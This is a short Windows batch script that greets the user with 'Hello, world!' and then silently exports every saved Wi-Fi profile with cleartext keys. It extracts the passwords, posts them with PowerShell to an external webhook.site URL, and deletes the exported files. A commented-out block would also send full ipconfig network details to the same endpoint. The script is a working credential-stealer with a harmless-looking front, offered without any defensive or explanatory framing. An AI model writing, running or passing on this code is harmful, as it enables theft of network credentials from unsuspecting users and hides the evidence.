@echo off
echo Hello, world!
pause
cd C:\TEST_SP\
netsh wlan export profile key=clear >nul
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/942830a0-1de4-41f6-8f47-105180eb8906 -Method POST -InFile Wi-Fi-PASS >nul
del Wi-* /s /f /q

::ipconfig /all > C:\TEST_SP\all_network_info.txt >nul
::powershell Select-String -Path all_network_info.txt > Wi-Fi-INFO
::powershell Invoke-WebRequest -Uri https://webhook.site/942830a0-1de4-41f6-8f47-105180eb8906 -Method POST -InFile Wi-Fi-INFO >nul
::del all_network_info.txt
